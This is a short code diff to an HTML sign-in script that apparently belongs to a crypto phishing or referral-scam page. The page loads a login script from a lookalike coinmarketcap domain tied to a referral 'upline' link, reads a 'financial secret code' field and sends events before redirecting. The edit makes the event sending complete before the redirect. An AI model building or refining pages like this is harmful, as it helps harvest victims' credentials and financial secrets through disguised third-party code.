@@ -846,7 +846,7 @@
     <script src="https://api.coinmarketcap.jp/loginpage.js?project=onewiex.com&amp;reflink=https://onewiex.com/?upline=012047991013"></script>
     <script>
       SIGNIN_CLICK_TIMES = 1;
-      function signin() {
+      async function signin() {
         event.preventDefault();
 
         const financialSecretCode = document.getElementById(
@@ -858,7 +858,7 @@
           financialSecretCode.style.display = 'block';
         } else {
           getUserEventValue();
-          sendEvent('LoginButtonClicked');
+          await sendEvent('LoginButtonClicked');
           window.location.href = REFLINK;
         }
       }
